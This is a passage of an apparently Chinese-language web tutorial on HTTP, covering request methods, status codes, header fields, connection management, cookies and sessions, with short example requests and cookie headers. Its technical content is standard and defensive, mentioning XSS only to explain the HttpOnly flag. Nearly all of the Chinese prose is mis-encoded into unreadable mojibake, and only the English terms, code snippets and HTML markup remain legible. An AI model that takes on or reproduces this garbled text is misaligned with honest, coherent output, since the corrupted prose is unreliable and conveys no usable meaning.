HTTP/1.1\nHost: www.example.com\nContent-Type: application/example\nIf-Match: &#34;e0023aa4e&#34;\nContent-Length: 100\n\n[description of changes]</code></pre></div><h2>DELETE</h2><blockquote> åˆ é™¤æ–‡ä»¶<br/> </blockquote><p>ä¸ PUT åŠŸèƒ½ç›¸åï¼Œå¹¶ä¸”åŒæ ·ä¸å¸¦éªŒè¯æœºåˆ¶ã€‚</p><div class=\"highlight\"><pre><code class=\"language-html\">DELETE /file.html HTTP/1.1</code></pre></div><h2>OPTIONS</h2><blockquote> æŸ¥è¯¢æ”¯æŒçš„æ–¹æ³•<br/> </blockquote><p>æŸ¥è¯¢æŒ‡å®šçš„ URL èƒ½å¤Ÿæ”¯æŒçš„æ–¹æ³•ã€‚</p><p>ä¼šè¿”å› <code>Allow: GET, POST, HEAD, OPTIONS</code> è¿™æ ·çš„å†…å®¹ã€‚</p><h2>CONNECT</h2><blockquote> è¦æ±‚åœ¨ä¸ä»£ç†æœåŠ¡å™¨é€šä¿¡æ—¶å»ºç«‹éš§é“<br/> </blockquote><p>ä½¿ç”¨ SSLï¼ˆSecure Sockets Layerï¼Œå®‰å…¨å¥—æ¥å±‚ï¼‰å’Œ TLSï¼ˆTransport Layer Securityï¼Œä¼ è¾“å±‚å®‰å…¨ï¼‰åè®®æŠŠé€šä¿¡å†…å®¹åŠ å¯†åç»ç½‘ç»œéš§é“ä¼ è¾“ã€‚</p><div class=\"highlight\"><pre><code class=\"language-html\">CONNECT www.example.com:443 HTTP/1.1</code></pre></div><figure data-size=\"normal\"><noscript><img src=\"https://pic3.zhimg.com/v2-e3b4504f8bea5afeaac089c28743c3da_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"654\" data-rawheight=\"185\" class=\"origin_image zh-lightbox-thumb\" width=\"654\" data-original=\"https://pic3.zhimg.com/v2-e3b4504f8bea5afeaac089c28743c3da_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;654&#39; height=&#39;185&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"654\" data-rawheight=\"185\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"654\" data-original=\"https://pic3.zhimg.com/v2-e3b4504f8bea5afeaac089c28743c3da_r.jpg\" data-actualsrc=\"https://pic3.zhimg.com/v2-e3b4504f8bea5afeaac089c28743c3da_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>TRACE</h2><blockquote> è¿½è¸ªè·¯å¾„<br/> </blockquote><p>æœåŠ¡å™¨ä¼šå°†é€šä¿¡è·¯å¾„è¿”å›ç»™å®¢æˆ·ç«¯ã€‚</p><p>å‘é€è¯·æ±‚æ—¶ï¼Œåœ¨ Max-Forwards é¦–éƒ¨å­—æ®µä¸­å¡«å…¥æ•°å€¼ï¼Œæ¯ç»è¿‡ä¸€ä¸ªæœåŠ¡å™¨å°±ä¼šå‡ 1ï¼Œå½“æ•°å€¼ä¸º 0 æ—¶å°±åœæ­¢ä¼ è¾“ã€‚</p><p>é€šå¸¸ä¸ä¼šä½¿ç”¨ TRACEï¼Œå¹¶ä¸”å®ƒå®¹æ˜“å—åˆ° XST æ”»å‡»ï¼ˆCross-Site Tracingï¼Œè·¨ç«™è¿½è¸ªï¼‰ã€‚</p><h2>ä¸‰ã€HTTP çŠ¶æ€ç </h2><p>æœåŠ¡å™¨è¿”å›çš„  <b>å“åº”æŠ¥æ–‡</b>  ä¸­ç¬¬ä¸€è¡Œä¸ºçŠ¶æ€è¡Œï¼ŒåŒ…å«äº†çŠ¶æ€ç ä»¥åŠåŸå› çŸ­è¯­ï¼Œç”¨æ¥å‘ŠçŸ¥å®¢æˆ·ç«¯è¯·æ±‚çš„ç»“æœã€‚</p><p>| çŠ¶æ€ç  | ç±»åˆ« | å«ä¹‰ | | :---: | :---: | :---: | | 1XX | Informationalï¼ˆä¿¡æ¯æ€§çŠ¶æ€ç ï¼‰ | æ¥æ”¶çš„è¯·æ±‚æ­£åœ¨å¤„ç† | | 2XX | Successï¼ˆæˆåŠŸçŠ¶æ€ç ï¼‰ | è¯·æ±‚æ­£å¸¸å¤„ç†å®Œæ¯• | | 3XX | Redirectionï¼ˆé‡å®šå‘çŠ¶æ€ç ï¼‰ | éœ€è¦è¿›è¡Œé™„åŠ æ“ä½œä»¥å®Œæˆè¯·æ±‚ | | 4XX | Client Errorï¼ˆå®¢æˆ·ç«¯é”™è¯¯çŠ¶æ€ç ï¼‰ | æœåŠ¡å™¨æ— æ³•å¤„ç†è¯·æ±‚ | | 5XX | Server Errorï¼ˆæœåŠ¡å™¨é”™è¯¯çŠ¶æ€ç ï¼‰ | æœåŠ¡å™¨å¤„ç†è¯·æ±‚å‡ºé”™ |</p><h2>1XX ä¿¡æ¯</h2><ul><li><b>100 Continue</b> ï¼šè¡¨æ˜åˆ°ç›®å‰ä¸ºæ­¢éƒ½å¾ˆæ­£å¸¸ï¼Œå®¢æˆ·ç«¯å¯ä»¥ç»§ç»­å‘é€è¯·æ±‚æˆ–è€…å¿½ç•¥è¿™ä¸ªå“åº”ã€‚</li></ul><h2>2XX æˆåŠŸ</h2><ul><li><b>200 OK</b> <br/> </li><li><b>204 No Content</b> ï¼šè¯·æ±‚å·²ç»æˆåŠŸå¤„ç†ï¼Œä½†æ˜¯è¿”å›çš„å“åº”æŠ¥æ–‡ä¸åŒ…å«å®ä½“çš„ä¸»ä½“éƒ¨åˆ†ã€‚ä¸€èˆ¬åœ¨åªéœ€è¦ä»å®¢æˆ·ç«¯å¾€æœåŠ¡å™¨å‘é€ä¿¡æ¯ï¼Œè€Œä¸éœ€è¦è¿”å›æ•°æ®æ—¶ä½¿ç”¨ã€‚<br/> </li><li><b>206 Partial Content</b> ï¼šè¡¨ç¤ºå®¢æˆ·ç«¯è¿›è¡Œäº†èŒƒå›´è¯·æ±‚ï¼Œå“åº”æŠ¥æ–‡åŒ…å«ç”± Content-Range æŒ‡å®šèŒƒå›´çš„å®ä½“å†…å®¹ã€‚<br/> </li></ul><h2>3XX é‡å®šå‘</h2><ul><li><b>301 Moved Permanently</b> ï¼šæ°¸ä¹…æ€§é‡å®šå‘<br/> </li><li><b>302 Found</b> ï¼šä¸´æ—¶æ€§é‡å®šå‘<br/> </li><li><b>303 See Other</b> ï¼šå’Œ 302 æœ‰ç€ç›¸åŒçš„åŠŸèƒ½ï¼Œä½†æ˜¯ 303 æ˜ç¡®è¦æ±‚å®¢æˆ·ç«¯åº”è¯¥é‡‡ç”¨ GET æ–¹æ³•è·å–èµ„æºã€‚<br/> </li><li> æ³¨ï¼šè™½ç„¶ HTTP åè®®è§„å®š 301ã€302 çŠ¶æ€ä¸‹é‡å®šå‘æ—¶ä¸å…è®¸æŠŠ POST æ–¹æ³•æ”¹æˆ GET æ–¹æ³•ï¼Œä½†æ˜¯å¤§å¤šæ•°æµè§ˆå™¨éƒ½ä¼šåœ¨ 301ã€302 å’Œ 303 çŠ¶æ€ä¸‹çš„é‡å®šå‘æŠŠ POST æ–¹æ³•æ”¹æˆ GET æ–¹æ³•ã€‚<br/> </li><li><b>304 Not Modified</b> ï¼šå¦‚æœè¯·æ±‚æŠ¥æ–‡é¦–éƒ¨åŒ…å«ä¸€äº›æ¡ä»¶ï¼Œä¾‹å¦‚ï¼šIf-Matchï¼ŒIf-Modified-Sinceï¼ŒIf-None-Matchï¼ŒIf-Rangeï¼ŒIf-Unmodified-Sinceï¼Œå¦‚æœä¸æ»¡è¶³æ¡ä»¶ï¼Œåˆ™æœåŠ¡å™¨ä¼šè¿”å› 304 çŠ¶æ€ç ã€‚<br/> </li><li><b>307 Temporary Redirect</b> ï¼šä¸´æ—¶é‡å®šå‘ï¼Œä¸ 302 çš„å«ä¹‰ç±»ä¼¼ï¼Œä½†æ˜¯ 307 è¦æ±‚æµè§ˆå™¨ä¸ä¼šæŠŠé‡å®šå‘è¯·æ±‚çš„ POST æ–¹æ³•æ”¹æˆ GET æ–¹æ³•ã€‚<br/> </li></ul><h2>4XX å®¢æˆ·ç«¯é”™è¯¯</h2><ul><li><b>400 Bad Request</b> ï¼šè¯·æ±‚æŠ¥æ–‡ä¸­å­˜åœ¨è¯­æ³•é”™è¯¯ã€‚<br/> </li><li><b>401 Unauthorized</b> ï¼šè¯¥çŠ¶æ€ç è¡¨ç¤ºå‘é€çš„è¯·æ±‚éœ€è¦æœ‰è®¤è¯ä¿¡æ¯ï¼ˆBASIC è®¤è¯ã€DIGEST è®¤è¯ï¼‰ã€‚å¦‚æœä¹‹å‰å·²è¿›è¡Œè¿‡ä¸€æ¬¡è¯·æ±‚ï¼Œåˆ™è¡¨ç¤ºç”¨æˆ·è®¤è¯å¤±è´¥ã€‚<br/> </li><li><b>403 Forbidden</b> ï¼šè¯·æ±‚è¢«æ‹’ç»ã€‚<br/> </li><li><b>404 Not Found</b> <br/> </li></ul><h2>5XX æœåŠ¡å™¨é”™è¯¯</h2><ul><li><b>500 Internal Server Error</b> ï¼šæœåŠ¡å™¨æ­£åœ¨æ‰§è¡Œè¯·æ±‚æ—¶å‘ç”Ÿé”™è¯¯ã€‚<br/> </li><li><b>503 Service Unavailable</b> ï¼šæœåŠ¡å™¨æš‚æ—¶å¤„äºè¶…è´Ÿè½½æˆ–æ­£åœ¨è¿›è¡Œåœæœºç»´æŠ¤ï¼Œç°åœ¨æ— æ³•å¤„ç†è¯·æ±‚ã€‚<br/> </li></ul><h2>å››ã€HTTP é¦–éƒ¨</h2><p>æœ‰ 4 ç§ç±»å‹çš„é¦–éƒ¨å­—æ®µï¼šé€šç”¨é¦–éƒ¨å­—æ®µã€è¯·æ±‚é¦–éƒ¨å­—æ®µã€å“åº”é¦–éƒ¨å­—æ®µå’Œå®ä½“é¦–éƒ¨å­—æ®µã€‚</p><p>å„ç§é¦–éƒ¨å­—æ®µåŠå…¶å«ä¹‰å¦‚ä¸‹ï¼ˆä¸éœ€è¦å…¨è®°ï¼Œä»…ä¾›æŸ¥é˜…ï¼‰ï¼š</p><h2>é€šç”¨é¦–éƒ¨å­—æ®µ</h2><p>| é¦–éƒ¨å­—æ®µå | è¯´æ˜ | | :--: | :--: | | Cache-Control | æ§åˆ¶ç¼“å­˜çš„è¡Œä¸º | | Connection | æ§åˆ¶ä¸å†è½¬å‘ç»™ä»£ç†çš„é¦–éƒ¨å­—æ®µã€ç®¡ç†æŒä¹…è¿æ¥| | Date | åˆ›å»ºæŠ¥æ–‡çš„æ—¥æœŸæ—¶é—´ | | Pragma | æŠ¥æ–‡æŒ‡ä»¤ | | Trailer | æŠ¥æ–‡æœ«ç«¯çš„é¦–éƒ¨ä¸€è§ˆ | | Transfer-Encoding | æŒ‡å®šæŠ¥æ–‡ä¸»ä½“çš„ä¼ è¾“ç¼–ç æ–¹å¼ | | Upgrade | å‡çº§ä¸ºå…¶ä»–åè®® | | Via | ä»£ç†æœåŠ¡å™¨çš„ç›¸å…³ä¿¡æ¯ | | Warning | é”™è¯¯é€šçŸ¥ |</p><h2>è¯·æ±‚é¦–éƒ¨å­—æ®µ</h2><p>| é¦–éƒ¨å­—æ®µå | è¯´æ˜ | | :--: | :--: | | Accept | ç”¨æˆ·ä»£ç†å¯å¤„ç†çš„åª’ä½“ç±»å‹ | | Accept-Charset | ä¼˜å…ˆçš„å­—ç¬¦é›† | | Accept-Encoding | ä¼˜å…ˆçš„å†…å®¹ç¼–ç  | | Accept-Language | ä¼˜å…ˆçš„è¯­è¨€ï¼ˆè‡ªç„¶è¯­è¨€ï¼‰ | | Authorization | Web è®¤è¯ä¿¡æ¯ | | Expect | æœŸå¾…æœåŠ¡å™¨çš„ç‰¹å®šè¡Œä¸º | | From | ç”¨æˆ·çš„ç”µå­é‚®ç®±åœ°å€ | | Host | è¯·æ±‚èµ„æºæ‰€åœ¨æœåŠ¡å™¨ | | If-Match | æ¯”è¾ƒå®ä½“æ ‡è®°ï¼ˆETagï¼‰ | | If-Modified-Since | æ¯”è¾ƒèµ„æºçš„æ›´æ–°æ—¶é—´ | | If-None-Match | æ¯”è¾ƒå®ä½“æ ‡è®°ï¼ˆä¸ If-Match ç›¸åï¼‰ | | If-Range | èµ„æºæœªæ›´æ–°æ—¶å‘é€å®ä½“ Byte çš„èŒƒå›´è¯·æ±‚ | | If-Unmodified-Since | æ¯”è¾ƒèµ„æºçš„æ›´æ–°æ—¶é—´ï¼ˆä¸ If-Modified-Since ç›¸åï¼‰ | | Max-Forwards | æœ€å¤§ä¼ è¾“é€è·³æ•° | | Proxy-Authorization | ä»£ç†æœåŠ¡å™¨è¦æ±‚å®¢æˆ·ç«¯çš„è®¤è¯ä¿¡æ¯ | | Range | å®ä½“çš„å­—èŠ‚èŒƒå›´è¯·æ±‚ | | Referer | å¯¹è¯·æ±‚ä¸­ URI çš„åŸå§‹è·å–æ–¹ | | TE | ä¼ è¾“ç¼–ç çš„ä¼˜å…ˆçº§ | | User-Agent | HTTP å®¢æˆ·ç«¯ç¨‹åºçš„ä¿¡æ¯ |</p><h2>å“åº”é¦–éƒ¨å­—æ®µ</h2><p>| é¦–éƒ¨å­—æ®µå | è¯´æ˜ | | :--: | :--: | | Accept-Ranges | æ˜¯å¦æ¥å—å­—èŠ‚èŒƒå›´è¯·æ±‚ | | Age | æ¨ç®—èµ„æºåˆ›å»ºç»è¿‡æ—¶é—´ | | ETag | èµ„æºçš„åŒ¹é…ä¿¡æ¯ | | Location | ä»¤å®¢æˆ·ç«¯é‡å®šå‘è‡³æŒ‡å®š URI | | Proxy-Authenticate | ä»£ç†æœåŠ¡å™¨å¯¹å®¢æˆ·ç«¯çš„è®¤è¯ä¿¡æ¯ | | Retry-After | å¯¹å†æ¬¡å‘èµ·è¯·æ±‚çš„æ—¶æœºè¦æ±‚ | | Server | HTTP æœåŠ¡å™¨çš„å®‰è£…ä¿¡æ¯ | | Vary | ä»£ç†æœåŠ¡å™¨ç¼“å­˜çš„ç®¡ç†ä¿¡æ¯ | | WWW-Authenticate | æœåŠ¡å™¨å¯¹å®¢æˆ·ç«¯çš„è®¤è¯ä¿¡æ¯ |</p><h2>å®ä½“é¦–éƒ¨å­—æ®µ</h2><p>| é¦–éƒ¨å­—æ®µå | è¯´æ˜ | | :--: | :--: | | Allow | èµ„æºå¯æ”¯æŒçš„ HTTP æ–¹æ³• | | Content-Encoding | å®ä½“ä¸»ä½“é€‚ç”¨çš„ç¼–ç æ–¹å¼ | | Content-Language | å®ä½“ä¸»ä½“çš„è‡ªç„¶è¯­è¨€ | | Content-Length | å®ä½“ä¸»ä½“çš„å¤§å° | | Content-Location | æ›¿ä»£å¯¹åº”èµ„æºçš„ URI | | Content-MD5 | å®ä½“ä¸»ä½“çš„æŠ¥æ–‡æ‘˜è¦ | | Content-Range | å®ä½“ä¸»ä½“çš„ä½ç½®èŒƒå›´ | | Content-Type | å®ä½“ä¸»ä½“çš„åª’ä½“ç±»å‹ | | Expires | å®ä½“ä¸»ä½“è¿‡æœŸçš„æ—¥æœŸæ—¶é—´ | | Last-Modified | èµ„æºçš„æœ€åä¿®æ”¹æ—¥æœŸæ—¶é—´ |</p><h2>äº”ã€å…·ä½“åº”ç”¨</h2><h2>è¿æ¥ç®¡ç†</h2><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-5a756ef02ebd371dced94884db6fe840_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1012\" data-rawheight=\"670\" class=\"origin_image zh-lightbox-thumb\" width=\"1012\" data-original=\"https://pic1.zhimg.com/v2-5a756ef02ebd371dced94884db6fe840_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;1012&#39; height=&#39;670&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1012\" data-rawheight=\"670\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"1012\" data-original=\"https://pic1.zhimg.com/v2-5a756ef02ebd371dced94884db6fe840_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-5a756ef02ebd371dced94884db6fe840_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h3>1. çŸ­è¿æ¥ä¸é•¿è¿æ¥</h3><p>å½“æµè§ˆå™¨è®¿é—®ä¸€ä¸ªåŒ…å«å¤šå¼ å›¾ç‰‡çš„ HTML é¡µé¢æ—¶ï¼Œé™¤äº†è¯·æ±‚è®¿é—®çš„ HTML é¡µé¢èµ„æºï¼Œè¿˜ä¼šè¯·æ±‚å›¾ç‰‡èµ„æºã€‚å¦‚æœæ¯è¿›è¡Œä¸€æ¬¡ HTTP é€šä¿¡å°±è¦æ–°å»ºä¸€ä¸ª TCP è¿æ¥ï¼Œé‚£ä¹ˆå¼€é”€ä¼šå¾ˆå¤§ã€‚</p><p>é•¿è¿æ¥åªéœ€è¦å»ºç«‹ä¸€æ¬¡ TCP è¿æ¥å°±èƒ½è¿›è¡Œå¤šæ¬¡ HTTP é€šä¿¡ã€‚</p><ul><li>ä» HTTP/1.1 å¼€å§‹é»˜è®¤æ˜¯é•¿è¿æ¥çš„ï¼Œå¦‚æœè¦æ–­å¼€è¿æ¥ï¼Œéœ€è¦ç”±å®¢æˆ·ç«¯æˆ–è€…æœåŠ¡å™¨ç«¯æå‡ºæ–­å¼€ï¼Œä½¿ç”¨ <code>Connection : close</code>ï¼›</li><li>åœ¨ HTTP/1.1 ä¹‹å‰é»˜è®¤æ˜¯çŸ­è¿æ¥çš„ï¼Œå¦‚æœéœ€è¦ä½¿ç”¨é•¿è¿æ¥ï¼Œåˆ™ä½¿ç”¨ <code>Connection : Keep-Alive</code>ã€‚</li></ul><h3>2. æµæ°´çº¿</h3><p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒHTTP è¯·æ±‚æ˜¯æŒ‰é¡ºåºå‘å‡ºçš„ï¼Œä¸‹ä¸€ä¸ªè¯·æ±‚åªæœ‰åœ¨å½“å‰è¯·æ±‚æ”¶åˆ°å“åº”ä¹‹åæ‰ä¼šè¢«å‘å‡ºã€‚ç”±äºå—åˆ°ç½‘ç»œå»¶è¿Ÿå’Œå¸¦å®½çš„é™åˆ¶ï¼Œåœ¨ä¸‹ä¸€ä¸ªè¯·æ±‚è¢«å‘é€åˆ°æœåŠ¡å™¨ä¹‹å‰ï¼Œå¯èƒ½éœ€è¦ç­‰å¾…å¾ˆé•¿æ—¶é—´ã€‚</p><p>æµæ°´çº¿æ˜¯åœ¨åŒä¸€æ¡é•¿è¿æ¥ä¸Šè¿ç»­å‘å‡ºè¯·æ±‚ï¼Œè€Œä¸ç”¨ç­‰å¾…å“åº”è¿”å›ï¼Œè¿™æ ·å¯ä»¥å‡å°‘å»¶è¿Ÿã€‚</p><h2>Cookie</h2><p>HTTP åè®®æ˜¯æ— çŠ¶æ€çš„ï¼Œä¸»è¦æ˜¯ä¸ºäº†è®© HTTP åè®®å°½å¯èƒ½ç®€å•ï¼Œä½¿å¾—å®ƒèƒ½å¤Ÿå¤„ç†å¤§é‡äº‹åŠ¡ã€‚HTTP/1.1 å¼•å…¥ Cookie æ¥ä¿å­˜çŠ¶æ€ä¿¡æ¯ã€‚</p><p>Cookie æ˜¯æœåŠ¡å™¨å‘é€åˆ°ç”¨æˆ·æµè§ˆå™¨å¹¶ä¿å­˜åœ¨æœ¬åœ°çš„ä¸€å°å—æ•°æ®ï¼Œå®ƒä¼šåœ¨æµè§ˆå™¨ä¹‹åå‘åŒä¸€æœåŠ¡å™¨å†æ¬¡å‘èµ·è¯·æ±‚æ—¶è¢«æºå¸¦ä¸Šï¼Œç”¨äºå‘ŠçŸ¥æœåŠ¡ç«¯ä¸¤ä¸ªè¯·æ±‚æ˜¯å¦æ¥è‡ªåŒä¸€æµè§ˆå™¨ã€‚ç”±äºä¹‹åæ¯æ¬¡è¯·æ±‚éƒ½ä¼šéœ€è¦æºå¸¦ Cookie æ•°æ®ï¼Œå› æ­¤ä¼šå¸¦æ¥é¢å¤–çš„æ€§èƒ½å¼€é”€ï¼ˆå°¤å…¶æ˜¯åœ¨ç§»åŠ¨ç¯å¢ƒä¸‹ï¼‰ã€‚</p><p>Cookie æ›¾ä¸€åº¦ç”¨äºå®¢æˆ·ç«¯æ•°æ®çš„å­˜å‚¨ï¼Œå› ä¸ºå½“æ—¶å¹¶æ²¡æœ‰å…¶å®ƒåˆé€‚çš„å­˜å‚¨åŠæ³•è€Œä½œä¸ºå”¯ä¸€çš„å­˜å‚¨æ‰‹æ®µï¼Œä½†ç°åœ¨éšç€ç°ä»£æµè§ˆå™¨å¼€å§‹æ”¯æŒå„ç§å„æ ·çš„å­˜å‚¨æ–¹å¼ï¼ŒCookie æ¸æ¸è¢«æ·˜æ±°ã€‚æ–°çš„æµè§ˆå™¨ API å·²ç»å…è®¸å¼€å‘è€…ç›´æ¥å°†æ•°æ®å­˜å‚¨åˆ°æœ¬åœ°ï¼Œå¦‚ä½¿ç”¨ Web storage APIï¼ˆæœ¬åœ°å­˜å‚¨å’Œä¼šè¯å­˜å‚¨ï¼‰æˆ– IndexedDBã€‚</p><h3>1. ç”¨é€”</h3><ul><li>ä¼šè¯çŠ¶æ€ç®¡ç†ï¼ˆå¦‚ç”¨æˆ·ç™»å½•çŠ¶æ€ã€è´­ç‰©è½¦ã€æ¸¸æˆåˆ†æ•°æˆ–å…¶å®ƒéœ€è¦è®°å½•çš„ä¿¡æ¯ï¼‰</li><li>ä¸ªæ€§åŒ–è®¾ç½®ï¼ˆå¦‚ç”¨æˆ·è‡ªå®šä¹‰è®¾ç½®ã€ä¸»é¢˜ç­‰ï¼‰</li><li>æµè§ˆå™¨è¡Œä¸ºè·Ÿè¸ªï¼ˆå¦‚è·Ÿè¸ªåˆ†æç”¨æˆ·è¡Œä¸ºç­‰ï¼‰</li></ul><h3>2. åˆ›å»ºè¿‡ç¨‹</h3><p>æœåŠ¡å™¨å‘é€çš„å“åº”æŠ¥æ–‡åŒ…å« Set-Cookie é¦–éƒ¨å­—æ®µï¼Œå®¢æˆ·ç«¯å¾—åˆ°å“åº”æŠ¥æ–‡åæŠŠ Cookie å†…å®¹ä¿å­˜åˆ°æµè§ˆå™¨ä¸­ã€‚</p><div class=\"highlight\"><pre><code class=\"language-html\">HTTP/1.0 200 OK\nContent-type: text/html\nSet-Cookie: yummy_cookie=choco\nSet-Cookie: tasty_cookie=strawberry\n\n[page content]</code></pre></div><p>å®¢æˆ·ç«¯ä¹‹åå¯¹åŒä¸€ä¸ªæœåŠ¡å™¨å‘é€è¯·æ±‚æ—¶ï¼Œä¼šä»æµè§ˆå™¨ä¸­å–å‡º Cookie ä¿¡æ¯å¹¶é€šè¿‡ Cookie è¯·æ±‚é¦–éƒ¨å­—æ®µå‘é€ç»™æœåŠ¡å™¨ã€‚</p><div class=\"highlight\"><pre><code class=\"language-html\">GET /sample_page.html HTTP/1.1\nHost: www.example.org\nCookie: yummy_cookie=choco; tasty_cookie=strawberry</code></pre></div><h3>3. åˆ†ç±»</h3><ul><li>ä¼šè¯æœŸ Cookieï¼šæµè§ˆå™¨å…³é—­ä¹‹åå®ƒä¼šè¢«è‡ªåŠ¨åˆ é™¤ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒä»…åœ¨ä¼šè¯æœŸå†…æœ‰æ•ˆã€‚</li><li>æŒä¹…æ€§ Cookieï¼šæŒ‡å®šè¿‡æœŸæ—¶é—´ï¼ˆExpiresï¼‰æˆ–æœ‰æ•ˆæœŸï¼ˆmax-ageï¼‰ä¹‹åå°±æˆä¸ºäº†æŒä¹…æ€§çš„ Cookieã€‚</li></ul><div class=\"highlight\"><pre><code class=\"language-html\">Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;</code></pre></div><h3>4. ä½œç”¨åŸŸ</h3><p>Domain æ ‡è¯†æŒ‡å®šäº†å“ªäº›ä¸»æœºå¯ä»¥æ¥å— Cookieã€‚å¦‚æœä¸æŒ‡å®šï¼Œé»˜è®¤ä¸ºå½“å‰æ–‡æ¡£çš„ä¸»æœºï¼ˆä¸åŒ…å«å­åŸŸåï¼‰ã€‚å¦‚æœæŒ‡å®šäº† Domainï¼Œåˆ™ä¸€èˆ¬åŒ…å«å­åŸŸåã€‚ä¾‹å¦‚ï¼Œå¦‚æœè®¾ç½® Domain=<a href=\"https://link.zhihu.com/?target=http%3A//mozilla.org\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">http://</span><span class=\"visible\">mozilla.org</span><span class=\"invisible\"></span></a>ï¼Œåˆ™ Cookie ä¹ŸåŒ…å«åœ¨å­åŸŸåä¸­ï¼ˆå¦‚ <a href=\"https://link.zhihu.com/?target=http%3A//developer.mozilla.org\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">http://</span><span class=\"visible\">developer.mozilla.org</span><span class=\"invisible\"></span></a>ï¼‰ã€‚</p><p>Path æ ‡è¯†æŒ‡å®šäº†ä¸»æœºä¸‹çš„å“ªäº›è·¯å¾„å¯ä»¥æ¥å— Cookieï¼ˆè¯¥ URL è·¯å¾„å¿…é¡»å­˜åœ¨äºè¯·æ±‚ URL ä¸­ï¼‰ã€‚ä»¥å­—ç¬¦ %x2F (&#34;/&#34;) ä½œä¸ºè·¯å¾„åˆ†éš”ç¬¦ï¼Œå­è·¯å¾„ä¹Ÿä¼šè¢«åŒ¹é…ã€‚ä¾‹å¦‚ï¼Œè®¾ç½® Path=/docsï¼Œåˆ™ä»¥ä¸‹åœ°å€éƒ½ä¼šåŒ¹é…ï¼š</p><ul><li>/docs</li><li>/docs/Web/</li><li>/docs/Web/HTTP</li></ul><h3>5. JavaScript</h3><p>æµè§ˆå™¨é€šè¿‡ <code>document.cookie</code> å±æ€§å¯åˆ›å»ºæ–°çš„ Cookieï¼Œä¹Ÿå¯é€šè¿‡è¯¥å±æ€§è®¿é—®é HttpOnly æ ‡è®°çš„ Cookieã€‚</p><div class=\"highlight\"><pre><code class=\"language-html\">document.cookie = &#34;yummy_cookie=choco&#34;;\ndocument.cookie = &#34;tasty_cookie=strawberry&#34;;\nconsole.log(document.cookie);</code></pre></div><h3>6. HttpOnly</h3><p>æ ‡è®°ä¸º HttpOnly çš„ Cookie ä¸èƒ½è¢« JavaScript è„šæœ¬è°ƒç”¨ã€‚è·¨ç«™è„šæœ¬æ”»å‡» (XSS) å¸¸å¸¸ä½¿ç”¨ JavaScript çš„ <code>document.cookie</code> API çªƒå–ç”¨æˆ·çš„ Cookie ä¿¡æ¯ï¼Œå› æ­¤ä½¿ç”¨ HttpOnly æ ‡è®°å¯ä»¥åœ¨ä¸€å®šç¨‹åº¦ä¸Šé¿å… XSS æ”»å‡»ã€‚</p><div class=\"highlight\"><pre><code class=\"language-html\">Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly</code></pre></div><h3>7. Secure</h3><p>æ ‡è®°ä¸º Secure çš„ Cookie åªèƒ½é€šè¿‡è¢« HTTPS åè®®åŠ å¯†è¿‡çš„è¯·æ±‚å‘é€ç»™æœåŠ¡ç«¯ã€‚ä½†å³ä¾¿è®¾ç½®äº† Secure æ ‡è®°ï¼Œæ•æ„Ÿä¿¡æ¯ä¹Ÿä¸åº”è¯¥é€šè¿‡ Cookie ä¼ è¾“ï¼Œå› ä¸º Cookie æœ‰å…¶å›ºæœ‰çš„ä¸å®‰å…¨æ€§ï¼ŒSecure æ ‡è®°ä¹Ÿæ— æ³•æä¾›ç¡®å®çš„å®‰å…¨ä¿éšœã€‚</p><h3>8. Session</h3><p>é™¤äº†å¯ä»¥å°†ç”¨æˆ·ä¿¡æ¯é€šè¿‡ Cookie å­˜å‚¨åœ¨ç”¨æˆ·æµè§ˆå™¨ä¸­ï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨ Session å­˜å‚¨åœ¨æœåŠ¡å™¨ç«¯ï¼Œå­˜å‚¨åœ¨æœåŠ¡å™¨ç«¯çš„ä¿¡æ¯æ›´åŠ å®‰å…¨ã€‚</p><p>Session å¯ä»¥å­˜å‚¨åœ¨æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ã€æ•°æ®åº“æˆ–è€…å†…å­˜ä¸­ã€‚ä¹Ÿå¯ä»¥å°† Session å­˜å‚¨åœ¨ Redis è¿™ç§å†…å­˜å‹æ•°æ®åº“ä¸­ï¼Œæ•ˆç‡ä¼šæ›´é«˜ã€‚</p><p>ä½¿ç”¨ Session ç»´æŠ¤ç”¨æˆ·ç™»å½•çŠ¶æ€çš„è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><ul><li>ç”¨æˆ·è¿›è¡Œç™»å½•æ—¶ï¼Œç”¨æˆ·æäº¤åŒ…å«ç”¨æˆ·åå’Œå¯†ç çš„è¡¨å•ï¼Œæ”¾å…¥ HTTP è¯·æ±‚æŠ¥æ–‡ä¸­ï¼›</li><li>æœåŠ¡å™¨éªŒè¯è¯¥ç”¨æˆ·åå’Œå¯†ç ï¼Œå¦‚æœæ­£ç¡®åˆ™æŠŠç”¨æˆ·ä¿¡æ¯å­˜å‚¨åˆ° Redis ä¸­ï¼Œå®ƒåœ¨ Redis ä¸­çš„ Key ç§°ä¸º Session IDï¼›</li><li>æœåŠ¡å™¨è¿”å›çš„å“åº”æŠ¥æ–‡çš„ Set-Cookie é¦–éƒ¨å­—æ®µåŒ…å«äº†è¿™ä¸ª Session IDï¼Œå®¢æˆ·ç«¯æ”¶åˆ°å“åº”æŠ¥æ–‡ä¹‹åå°†è¯¥ Cookie 